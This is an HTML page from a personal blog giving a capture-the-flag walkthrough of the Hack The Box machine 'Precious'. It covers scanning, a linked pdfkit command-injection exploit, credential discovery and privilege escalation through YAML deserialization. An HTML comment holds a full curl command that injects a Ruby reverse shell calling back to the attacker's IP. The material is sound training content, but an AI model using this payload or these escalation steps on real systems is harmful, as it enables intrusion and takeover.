@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Precious</title>
+  <link rel="icon" href="logo/widgeons-way-website-favicon-color.png">
+    <link rel="icon" href="logo/widgeons-way-website-favicon-color.png" sizes="">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css" integrity="sha384-DyZ88mC6Up2uqS4h/KRgHuoeGwBcD4Ng9SiP4dIRy0EXTlnuz47vAwmeGwVChigm" crossorigin="anonymous"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+
+    <link rel="icon" href="img/widgeonswaylogo.png" />
+   
+    <link href="/css/general.css" rel="stylesheet">  
+     <link href="/css/queries.css" rel="stylesheet"> 
+     <link href="/css/walkthroughs.css" rel="stylesheet"> 
+ 
+    
+    <script src="https://code.iconify.design/iconify-icon/1.0.5/iconify-icon.min.js"></script>
+</head>
+<body>
+    <header class="header ">
+      <a href="/">
+        <img class="logo" alt="Widgeon's Way Logo" src="/img/widgeonswaylogo.png"/>
+      </a>
+
+      <nav class="main-nav " id="menulinks">
+        <ul class="main-nav-list">
+          <li><a class="main-nav-link" href="/">Home</a></li>
+          <li><a class="main-nav-link" href="/toolkit/">Toolkit</a></li>
+          <li>
+            <a class="main-nav-link" href="/playbook/">Play Book</a>
+          </li>
+          <li><a class="main-nav-link" href="/walkthroughs/">Walk-Throughs</a></li>
+          <li><a class="main-nav-link" href="/widgeon-ctf/">Widgeon CTF</a></li>
+          <li><a class="main-nav-link nav-cta" href="/about/">About</a></li>
+        </ul>
+      </nav>
+      <button class="btn-mobile-nav">
+        <i class="icon-mobile-nav fa-solid fa-bars"></i>
+        <i class="icon-mobile-nav fa-solid fa-x"></i>
+        
+      
+      </button>
+    </header>
+        <main class="container"id="walkthrough">    
+            <div class="content">
+                <p class="walkthrough-date">February 5, 2023</p>
+                
+                        <h1 class="header-primary-walkthrough">Precious</h1>
+                     
+        
+                        <h3 class="header-tertiary-walkthrough center-text">Tools Needed: Nmap, Gobuster, NetCat and Linpeas</h3>
+                       
+         
+            
+            <img class="walkthrough-img" id="small" src="./img/Precious.png" alt="Precious Cover Photo">
+       
+          
+                <h2 class="header-secondary-walkthrough">Step 1: Start off with an Nmap Scan</h2>       
+               
+             
+                <p class="walkthrough-copy"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-copy"></i></button><code>nmap -sV -sC &lt;IP ADDRESS&gt; -oA &lt;FILE NAME&gt;</code></p>
+              
+
+<img class="walkthrough-img" src="./img/Picture1.png" alt="Nmap scan">
+
+
+
+<p class="description">Add in precious to the /etc/hosts file. This is a very common thing for Hack The Box and it will save you on some headaches later on.</p>
+<img class="walkthrough-img" src="./img/Picture2.png" alt="/etc/hosts">
+
+<p class="description">We can see that port 80 is open which likely means there is a website.</p>
+
+<p class="description">When a CTF challenge has a website, I immediately think “gobuster and burp suite”. Gobuster is a great tool to enumerate a website. It allows us to scan for potential directories, such as www.&lt;WEBSITE&gt;.com/dev as well as vhosts on the host such as dev.&lt;WEBSITE&gt;.com</p>
+
+<p class="description">This will scan for any directories that come after the main website: </p>
+    <p class="walkthrough-copy"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-copy"></i></button><code>gobuster dir -u http://precious.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
+
+   
+<img class="walkthrough-img" src="./img/Picture3.png" alt="gobuster">
+
+<p class="description">This one will scan for any vhosts: </p>
+    <p class="walkthrough-copy"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-copy"></i></button><code>gobuster vhost -u http://precious.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt –append-domain</code></p>
+    <p class="description">Unfortunately, both gobuster scans found nothing. We still know very little about this box. http://precious.htb takes us to this page. It is very empty, all we are able to do is convert a webpage to pdf on their website.</p>
+   
+<img class="walkthrough-img" src="./img/Picture4.png" alt="gobuster">
+
+<p class="description">We can capture the request on burp suite.</p>
+<img class="walkthrough-img" src="./img/Picture5.png" alt="precious webpage">
+
+<p class="description">Nothing for a remote host But we can try from our own machine. Set up a quick server to test:  </p>
+    <p class="walkthrough-copy"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-copy"></i></button><code>python3 -m http.server</code></p>
+   
+<img class="walkthrough-img" src="./img/Picture6.png" alt="burp suite">
+<img class="walkthrough-img" src="./img/Picture7.png" alt="python server">
+
+<p class="description">Looks like we can get some more information out of this.</p>
+<img class="walkthrough-img" src="./img/Picture8.png" alt="burp suite">
+
+<p class="description">Htmltopdf 0.12.6 , ruby, rubies are precious, get it?</p>
+<img class="walkthrough-img" src="./img/Picture9.png" alt="burp suite">
+
+<p class="description">Google searching about ruby pdf kits leads us to this github link: 
+    <p class="walkthrough-copy"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-copy"></i></button><a href="https://github.com/CyberArchitect1/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell">https://github.com/CyberArchitect1/CVE-2022-25765-pdfkit-Exploit-Reverse-Shell</a></p>
+    </p>
+<img class="walkthrough-img" src="./img/Picture10.png" alt="">
+
+<p class="description">Used notepad++ to edit the script to add in the values indicated.</p>
+<img class="walkthrough-img" src="./img/Picture11.png" alt="notepad ++ replace feature">
+
+<!-- <p class="description">The completed, edited script is: </p> -->
+<!-- <p class="description" id="small-text">    curl 'precious.htb' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://precious.htb' -H 'Connection: keep-alive' -H 'Referer: http://precious.htb' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2F10.10.14.51%3A8000%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.51%22%2C1234%29%29%27%60'</p> -->
+</p>
+<p class="description">You need to edit it so that your IP and the machines IP/webpage are in the proper place. You also need to sanitize it by replacing all spaces with %20 This is a safety measure taken so that people can not inject bad code into that section. For example, certain characters like “, &gt;, [} can break certain programming languages if they are interpreted. This is very commonly referred to as an injection and by sanitizing malicious characters, you reduce the risk that a malicious actor will input one of these characters to escape normal program functionality and instead execute their own commands or insert data into unexpected places.</p>
+
+<p class="description">For this script to execute you will need three parts:</p>
+<p class="description">1. We will need to have our netcat listener read</p>
+<p class="description">2. We will need our own http server</p>
+<p class="description">3. We need to curl the request to the server</p>
+
+<p class="description">Once this is done, we should have access.</p>
+<img class="walkthrough-img" src="./img/Picture12.png" alt="curl">
+<img class="walkthrough-img" src="./img/Picture13.png" alt="curl">
+<img class="walkthrough-img" src="./img/Picture14.png" alt="netcat listener">
+
+<p class="description">We are in, but not as user quite yet. We can try using linpeas to start some enumeration going on the machine.</p>
+<img class="walkthrough-img" src="./img/Picture15.png" alt="curl linpeas">
+<img class="walkthrough-img" src="./img/Picture16.png" alt="">
+<img class="walkthrough-img" src="./img/Picture17.png" alt="">
+<img class="walkthrough-img" src="./img/Picture18.png" alt="running linpeas">
+<img class="walkthrough-img" src="./img/Picture19.png" alt="linpeas results">
+
+<p class="description">Not much from linPEAS that screams low hanging fruit, so let’s do some manual enumeration for now.</p>
+
+<p class="description">Doing ls -al shows us an interesting hidden folder called .bundle Inside there we find a config file which gives us a user password!</p>
+<img class="walkthrough-img" src="./img/Picture20.png" alt="">
+
+<p class="description">we can use su henry and our new password to get in as user and grab our user flag.</p>
+<img class="walkthrough-img" src="./img/Picture21.png" alt="">
+
+<p class="description">We can run ruby as root, but only the update dependencies.rb file. If it was just ruby, we’d be root by now!</p>
+<img class="walkthrough-img" src="./img/Picture22.png" alt="">
+
+<p class="description">We can read the update_dependencies.rb file and there’s something very interesting about it.</p>
+<img class="walkthrough-img" src="./img/Picture23.png" alt="">
+
+<p class="description">We can see it’s reading the file “dependencies.yml” but it does not specify an absolute path, this means as long as we’re able to create a file as henry somewhere on this computer, we can run sudo /usr/bin/ruby /opt/update_dependencies.rb and it will read our dependencies.yml file of our current directory. Going to google for “ruby yaml exploit” and we find the first link with some useful information. We’re able to create a .yml file based off this webpage. You can edit the file to run commands you want, just put it in the git_set: “COMMAND HERE” https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/</p>
+
+<p class="description">I decided to try reading the root flag to see if this works.</p>
+<img class="walkthrough-img" src="./img/Picture24.png" alt="">
+
+<p class="description">Then running our sudo command we can get command execution and we can cat the root flag.</p>
+<img class="walkthrough-img" src="./img/Picture25.png" alt="root flag">
+
+<p class="description">Success! Precious has been pwned 😎</p>
+<img class="walkthrough-img" src="./img/Picture26.png" alt="Precious has been pwned artwork">
+
+      
+    
+            </div>
+  
+</main>
+  <!------------------- Footer ------------------->
+  <footer class="footer center-text" >
+    <div class="center-text grid grid--3-cols">
+      
+        <div class="footer__navigation">
+          <ul class="footer__list">
+            <li class="footer__item"><a href="https://github.com/widgeonsway" class="footer__link"><i class="fab fa-github"></a></i></li>
+            <li class="footer__item"><a href="https://tryhackme.com/p/widgeon" class="footer__link"><iconify-icon icon="simple-icons:tryhackme"></a></iconify-icon></li>
+            <li class="footer__item"><a href="https://app.hackthebox.com/users/1201996" class="footer__link"><iconify-icon icon="simple-icons:hackthebox"></a></iconify-icon>
+            <li class="footer__item"><a href="https://www.linkedin.com/in/stormypleym/" class="footer__link"><i class="fa-brands fa-linkedin"></i>
+            <li class="footer__item"><a href="mailto:stormy.pleym@gmail.com" class="footer__link"><i class="fa-solid fa-envelope"></a></i></li>
+          </ul>
+        </div>
+      <div class="footer__logo-box ">
+       <span>Widgeon's Way</span>
+        <p class="center-text">Thank you</p>
+        <p class="center-text">Made by <img class="duck" src="/img/widgeonswaylogo.png" width="18" height="18"><a href="about.html"> Widgeon</a></p>
+      </div>
+      
+      <div class="copyright">
+        Copyright &copy; <span class="year">2027 </span> Widgeon's Way
+       
+      </div>
+      
+    </div>
+   
+    <button onclick="scrollToTop()" id="topBtn" title="Go to top">
+      Back to top
+    </button>
+    </footer>
+
+    <script src="https://code.iconify.design/iconify-icon/1.0.5/iconify-icon.min.js"></script>
+    <script src="/scripts/script.js"></script>
+    <script>
+        function copyToClipboard(button) {
+            const text = button.parentElement.textContent.trim();
+            navigator.clipboard.writeText(text).then(() => {
+                button.innerHTML = '<i class="fa-solid fa-check"></i>'; 
+                setTimeout(() => button.innerHTML = '<i class="fa-solid fa-copy"></i>', 2000); 
+            }).catch(err => console.error('Error copying text:', err));
+        }
+        </script>
+ 
+  </body>
+
+    
+ 
+</body>
+</html>
+
